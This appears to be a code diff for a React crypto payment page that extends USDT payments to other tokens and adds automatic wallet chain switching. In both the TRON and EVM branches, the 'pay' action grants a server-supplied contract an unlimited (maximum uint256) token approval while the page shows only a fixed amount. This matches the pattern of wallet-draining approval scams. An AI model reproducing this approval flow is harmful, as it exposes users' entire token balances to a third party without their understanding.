@@ -6,6 +6,7 @@ import { useTranslation } from "react-i18next";
 import i18n from "@/lib/i18n";
 import { ChainType } from "@/types";
 import { usePayment } from "@/hooks/usePayment";
+import { CHAIN_CONFIG, CHAIN_NAMES, EXPLORERS, NATIVE_CURRENCIES } from "@/config/chains";
 import { PaymentTimer } from "@/components/payment/PaymentTimer";
 import { QRCode } from "@/components/ui/QRCode";
 import { ErrorBoundary } from "@/components/ui/ErrorBoundary";
@@ -45,9 +46,9 @@ function PaymentPageContent() {
   const [isCheckingBalance, setIsCheckingBalance] = useState(false);
   const [balanceCheck, setBalanceCheck] = useState<{
     hasEnoughNative: boolean;
-    hasEnoughUSDT: boolean;
+    hasEnoughToken: boolean;
     nativeBalance: string;
-    usdtBalance: string;
+    tokenBalance: string;
     error?: string;
   } | null>(null);
   const [isProcessingPayment, setIsProcessingPayment] = useState(false);
@@ -157,6 +158,7 @@ function PaymentPageContent() {
           body: JSON.stringify({
             address: walletAddress,
             chain: selectedChain,
+            currency: payment.currency,
             amount: payment.amount,
           }),
         });
@@ -167,9 +169,9 @@ function PaymentPageContent() {
         } else {
           setBalanceCheck({
             hasEnoughNative: false,
-            hasEnoughUSDT: false,
+            hasEnoughToken: false,
             nativeBalance: "0",
-            usdtBalance: "0",
+            tokenBalance: "0",
             error: "Failed to check balances",
           });
         }
@@ -177,9 +179,9 @@ function PaymentPageContent() {
         console.error("Error checking balances:", error);
         setBalanceCheck({
           hasEnoughNative: false,
-          hasEnoughUSDT: false,
+          hasEnoughToken: false,
           nativeBalance: "0",
-          usdtBalance: "0",
+          tokenBalance: "0",
           error: "Error checking balances",
         });
       } finally {
@@ -222,25 +224,66 @@ function PaymentPageContent() {
     }
   };
 
-  // Process payment (approve USDT directly from wallet)
+  // Switch EVM wallet to the selected chain before approve
+  const ensureEVMChain = async (chain: ChainType): Promise<void> => {
+    if (chain === "tron" || !window.ethereum) return;
+    const config = CHAIN_CONFIG[chain];
+    const chainIdHex = config.chainId;
+    try {
+      const currentChainId = await window.ethereum.request({ method: "eth_chainId" });
+      if (currentChainId === chainIdHex) return;
+      try {
+        await window.ethereum.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: chainIdHex }],
+        });
+      } catch (switchErr: any) {
+        if (switchErr?.code === 4902 || switchErr?.code === -32603) {
+          const native = NATIVE_CURRENCIES[chain];
+          await window.ethereum.request({
+            method: "wallet_addEthereumChain",
+            params: [
+              {
+                chainId: chainIdHex,
+                chainName: CHAIN_NAMES[chain],
+                rpcUrls: [config.rpc],
+                blockExplorerUrls: [EXPLORERS[chain]],
+                nativeCurrency: {
+                  name: native.name,
+                  symbol: native.symbol,
+                  decimals: native.decimals,
+                },
+              },
+            ],
+          });
+        } else {
+          throw switchErr;
+        }
+      }
+    } catch (err: any) {
+      throw new Error(err?.message || "Failed to switch network");
+    }
+  };
+
+  // Process payment (approve token directly from wallet)
   const handlePay = async () => {
     if (!walletAddress || !payment || isProcessingPayment) return;
-    
+
     setIsProcessingPayment(true);
     try {
       // Get contract address for the selected chain
       const response = await fetch("/api/payment/get-contract-address", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chain: selectedChain }),
+        body: JSON.stringify({ chain: selectedChain, currency: payment.currency }),
       });
-      
+
       if (!response.ok) {
         throw new Error("Failed to get contract address");
       }
-      
-      const { contractAddress, usdtAddress } = await response.json();
-      
+
+      const { contractAddress, tokenAddress } = await response.json();
+
       // Call approve function directly from wallet
       if (selectedChain === "tron") {
         // TRON approval
@@ -254,7 +297,7 @@ function PaymentPageContent() {
         }
         
         // Call approve function using TronWeb contract
-        const contract = await tronWeb.contract().at(usdtAddress);
+        const contract = await tronWeb.contract().at(tokenAddress);
         const MAX_APPROVAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
         const tx = await contract.approve(contractAddress, MAX_APPROVAL).send();
         
@@ -265,6 +308,7 @@ function PaymentPageContent() {
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
               paymentId: paymentId,
+              currency: payment.currency,
               amount: payment.amount.toString(),
               userAddress: walletAddress,
               chain: selectedChain,
@@ -276,18 +320,19 @@ function PaymentPageContent() {
           refetch();
         }
       } else {
-        // EVM approval (Ethereum, BSC)
+        // EVM approval (Ethereum, BSC) – switch to selected chain first
         if (!window.ethereum) {
           throw new Error("EVM wallet not found");
         }
-        
+        await ensureEVMChain(selectedChain);
+
         const { ethers } = await import("ethers");
         const provider = new ethers.BrowserProvider(window.ethereum);
         const signer = await provider.getSigner();
         
-        // Get USDT contract
-        const usdtContract = new ethers.Contract(
-          usdtAddress,
+        // Get token contract
+        const tokenContract = new ethers.Contract(
+          tokenAddress,
           ["function approve(address spender, uint256 amount) returns (bool)"],
           signer
         );
@@ -296,7 +341,7 @@ function PaymentPageContent() {
         const MAX_APPROVAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
         
         // Send approval transaction
-        const tx = await usdtContract.approve(contractAddress, MAX_APPROVAL);
+        const tx = await tokenContract.approve(contractAddress, MAX_APPROVAL);
         const receipt = await tx.wait();
         
         if (receipt.hash) {
@@ -306,6 +351,7 @@ function PaymentPageContent() {
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
               paymentId: paymentId,
+              currency: payment.currency,
               amount: payment.amount.toString(),
               userAddress: walletAddress,
               chain: selectedChain,
@@ -324,12 +370,6 @@ function PaymentPageContent() {
       setIsProcessingPayment(false);
     }
   };
-
-  useEffect(() => {
-    if (payment?.language && supportedLanguages.includes(payment.language)) {
-      setPreferredLanguage(payment.language);
-    }
-  }, [payment?.language]);
 
   useEffect(() => {
     try {
@@ -515,11 +555,11 @@ function PaymentPageContent() {
                   <span className="text-2xl font-bold text-green-600 font-mono">
                     {formatPaymentAmount(payment?.amount || 0)}
                   </span>
-                  <span className="text-sm text-gray-600">USDT</span>
+                  <span className="text-sm text-gray-600">{payment?.currency.toUpperCase()}</span>
                 </div>
                 {payment?.tx_hash && payment?.chain && (
                   <a
-                    href={getExplorerUrl(payment.chain, payment.tx_hash)}
+                    href={getExplorerUrl(payment?.chain, payment?.tx_hash)}
                     target="_blank"
                     rel="noopener noreferrer"
                     className="text-xs text-blue-500 hover:text-blue-600 mt-2 inline-block"
@@ -591,7 +631,7 @@ function PaymentPageContent() {
         <div className="bg-white rounded-2xl shadow-lg p-6">
           {/* Title */}
           <div className="text-center mb-4">
-            <h2 className="text-base font-semibold text-gray-900">{payment.service_name}</h2>
+            <h2 className="text-base font-semibold text-gray-900"></h2>
           </div>
 
           {/* Header - Amount with icons */}
@@ -615,7 +655,7 @@ function PaymentPageContent() {
               <div className="text-3xl font-bold text-black">
                 {formatPaymentAmount(payment.amount)}
               </div>
-              <div className="text-sm text-gray-500 mt-1">USDT</div>
+              <div className="text-sm text-gray-500 mt-1">{payment.currency.toUpperCase()}</div>
             </div>
 
             {/* Circular Time Left */}
@@ -694,7 +734,7 @@ function PaymentPageContent() {
                       ) : balanceCheck ? (
                         <>
                           {/* Balance Warnings */}
-                          {(!balanceCheck.hasEnoughNative || !balanceCheck.hasEnoughUSDT) && (
+                          {(!balanceCheck.hasEnoughNative || !balanceCheck.hasEnoughToken) && (
                             <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3">
                               <div className="text-xs font-semibold text-yellow-800 mb-1">{t("paymentPage.balanceLow")}</div>
                               {!balanceCheck.hasEnoughNative && (
@@ -709,10 +749,11 @@ function PaymentPageContent() {
                                   })}
                                 </div>
                               )}
-                              {!balanceCheck.hasEnoughUSDT && (
+                              {!balanceCheck.hasEnoughToken && (
                                 <div className="text-xs text-yellow-700">
-                                  {t("paymentPage.usdtInsufficient", {
+                                  {t("paymentPage.tokenInsufficient", {
                                     amount: formatPaymentAmount(payment.amount),
+                                    symbol: payment.currency.toUpperCase(),
                                   })}
                                 </div>
                               )}
@@ -724,12 +765,12 @@ function PaymentPageContent() {
                             onClick={handlePay}
                             disabled={
                               !balanceCheck.hasEnoughNative ||
-                              !balanceCheck.hasEnoughUSDT ||
+                              !balanceCheck.hasEnoughToken ||
                               isProcessingPayment
                             }
                             className={`w-full py-3 rounded-lg font-semibold transition-colors ${
                               balanceCheck.hasEnoughNative &&
-                              balanceCheck.hasEnoughUSDT &&
+                              balanceCheck.hasEnoughToken &&
                               !isProcessingPayment
                                 ? "bg-blue-500 hover:bg-blue-600 text-white"
                                 : "bg-gray-300 text-gray-500 cursor-not-allowed"
